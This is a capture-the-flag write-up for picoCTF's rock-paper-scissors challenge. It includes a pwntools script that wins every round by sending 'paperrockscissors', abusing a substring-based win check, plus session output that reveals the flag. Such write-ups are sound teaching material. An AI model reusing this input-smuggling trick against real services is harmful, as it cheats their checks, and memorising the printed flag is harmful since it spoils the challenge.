## Objetivo

Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/146/game-redacted.c).Connect to the program with netcat:`$ nc saturn.picoctf.net 59952`

Hint
- How does the program check if you won?
## Solucion

```python
from pwn import *

p = remote ('saturn.picoctf.net', 52560)

for i in range(5):
	print(p.recvuntil(b'exit the program'))
	p.sendline(b'1')
	print(p.recvuntil(b'(rock/paper/scissors)'))
	p.sendline(b'paperrockscissors')

p.recvuntil(b"Congrats, here's the flag!")
print(p.recvuntil(b'}').decode())
p.sendline (b'2')
p.close
```

```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/binexp/parte-1/RPS]
└─$ python3 solved.py
[+] Opening connection to saturn.picoctf.net on port 52560: Done
b"Welcome challenger to the game of Rock, Paper, Scissors\r\nFor anyone that beats me 5 times in a row, I will offer up a flag I found\r\nAre you ready?\r\nType '1' to play a game\r\nType '2' to exit the program"
b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: paper\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: rock\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: rock\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: scissors\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'

picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}
[*] Closed connection to saturn.picoctf.net port 52560
```
## Notas adicionales
## Referencias